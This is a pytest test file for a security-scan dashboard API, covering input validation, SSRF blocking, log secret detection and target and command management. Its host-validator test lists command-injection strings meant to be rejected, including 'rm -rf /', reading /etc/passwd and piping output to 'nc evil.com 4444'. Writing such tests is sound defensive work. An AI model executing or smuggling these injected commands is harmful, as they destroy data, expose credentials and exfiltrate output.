import pytest
import json
from httpx import AsyncClient, ASGITransport
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker

from app.main import app
from app.database.models import Base, User, Target, CommandConfig, RunHistory
from app.database.session import get_db
from app.auth.deps import get_current_user
from app.services.analyzer import OutputAnalyzer
from app.services.runner import CommandRunner

@pytest.fixture(autouse=True)
def clear_dependency_overrides():
    yield
    app.dependency_overrides.clear()

async def setup_test_context():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    TestingSessionLocal = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
    test_user = User(id=1, username="test_analyst", email="analyst@example.com", is_active=True, role="Admin", hashed_password="pw")

    async with TestingSessionLocal() as db:
        db.add(test_user)
        await db.commit()

    async def override_get_db():
        async with TestingSessionLocal() as db:
            yield db

    async def override_get_current_user():
        return test_user

    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[get_current_user] = override_get_current_user
    return TestingSessionLocal

def test_output_analyzer_pass():
    raw_output = "Starting scan...\nAll ports filtered\nScan completed in 1.2s"
    rules_json = json.dumps({
        "rules": [
            {"pattern": "22/open", "severity": "Warning", "message": "SSH Open"},
            {"pattern": "VULNERABILITY", "severity": "Critical", "message": "Flaw"}
        ]
    })
    result = OutputAnalyzer.analyze_output(raw_output, rules_json)
    assert result["status"] == "Pass"
    assert len(result["findings"]) == 0

def test_output_analyzer_warning_and_critical():
    raw_output = "Port 22/open detected\nVULNERABILITY: SQL injection found"
    rules_json = json.dumps({
        "rules": [
            {"pattern": "22/open", "severity": "Warning", "message": "SSH Open"},
            {"pattern": "VULNERABILITY", "severity": "Critical", "message": "Flaw"}
        ]
    })
    result = OutputAnalyzer.analyze_output(raw_output, rules_json)
    assert result["status"] == "Fail"  # Critical promotes status to Fail
    assert len(result["findings"]) == 2
    assert any(f["severity"] == "Critical" for f in result["findings"])
    assert any(f["severity"] == "Warning" for f in result["findings"])

def test_host_validator():
    # Valid hosts
    assert CommandRunner.validate_target_host("example.com") is True
    assert CommandRunner.validate_target_host("sub.domain.co.uk") is True
    assert CommandRunner.validate_target_host("192.168.1.1") is True
    assert CommandRunner.validate_target_host("8.8.8.8") is True
    assert CommandRunner.validate_target_host("localhost") is True
    assert CommandRunner.validate_target_host("https://google.com") is True

    # Dangerous / Injection attempts
    assert CommandRunner.validate_target_host("example.com; rm -rf /") is False
    assert CommandRunner.validate_target_host("example.com && whoami") is False
    assert CommandRunner.validate_target_host("`cat /etc/passwd`") is False
    assert CommandRunner.validate_target_host("$(calc.exe)") is False
    assert CommandRunner.validate_target_host("host | nc evil.com 4444") is False

@pytest.mark.asyncio
async def test_manual_log_analyzer_endpoint():
    await setup_test_context()
    log_text = """
    --- File: src/components/Dashboard.tsx ---
    const user_token = "ghp_1234567890abcdef"; // secret leak
    Line 42: Identifier directly after number 100px
    Line 99: Unexpected token <
    """
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        res = await client.post("/runs/analyze-manual", json={"log_text": log_text})
        assert res.status_code == 200
        data = res.json()
        assert data["status"] in ("Warning", "Fail")
        assert len(data["findings"]) >= 2
        assert any("secret" in f["message"].lower() or "token" in f["message"].lower() for f in data["findings"])

@pytest.mark.asyncio
async def test_url_speed_test_ssrf_protection():
    await setup_test_context()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Attempt SSRF to private IP
        res = await client.post("/runs/url-speed-test", json={"url": "http://127.0.0.1:8080"})
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is False
        assert "SSRF Protection" in data["status_text"]

@pytest.mark.asyncio
async def test_targets_api_lifecycle():
    await setup_test_context()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # 1. Create target
        create_res = await client.post(
            "/targets/",
            json={"name": "Production Gateway", "host": "api.example.com", "description": "Primary edge"}
        )
        assert create_res.status_code == 201
        target = create_res.json()
        target_id = target["id"]
        assert target["name"] == "Production Gateway"
        assert target["host"] == "api.example.com"

        # 2. List targets
        list_res = await client.get("/targets/")
        assert list_res.status_code == 200
        targets = list_res.json()
        assert any(t["id"] == target_id for t in targets)

        # 3. Reject invalid target
        invalid_res = await client.post(
            "/targets/",
            json={"name": "Bad Target", "host": "bad; host & attack"}
        )
        assert invalid_res.status_code == 422

        # 4. Delete target
        del_res = await client.delete(f"/targets/{target_id}")
        assert del_res.status_code == 204

@pytest.mark.asyncio
async def test_commands_api_lifecycle():
    await setup_test_context()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # 1. Create CommandConfig with approved executable
        create_res = await client.post(
            "/commands/",
            json={
                "name": "Custom Ping Scan",
                "executable": "ping",
                "allowed_args": ["-c", "2", "-n", "2"],
                "timeout_seconds": 15,
                "regex_rules": {"rules": []}
            }
        )
        assert create_res.status_code == 201
        cmd = create_res.json()
        cmd_id = cmd["id"]
        assert cmd["name"] == "Custom Ping Scan"

        # 2. Reject unapproved executable
        bad_res = await client.post(
            "/commands/",
            json={
                "name": "Malicious Command",
                "executable": "powershell.exe",
                "allowed_args": ["-Command", "evil"],
                "timeout_seconds": 10
            }
        )
        assert bad_res.status_code == 422

        # 3. List commands
        list_res = await client.get("/commands/")
        assert list_res.status_code == 200
        cmds = list_res.json()
        assert any(c["id"] == cmd_id for c in cmds)

        # 4. Delete command
        del_res = await client.delete(f"/commands/{cmd_id}")
        assert del_res.status_code == 204
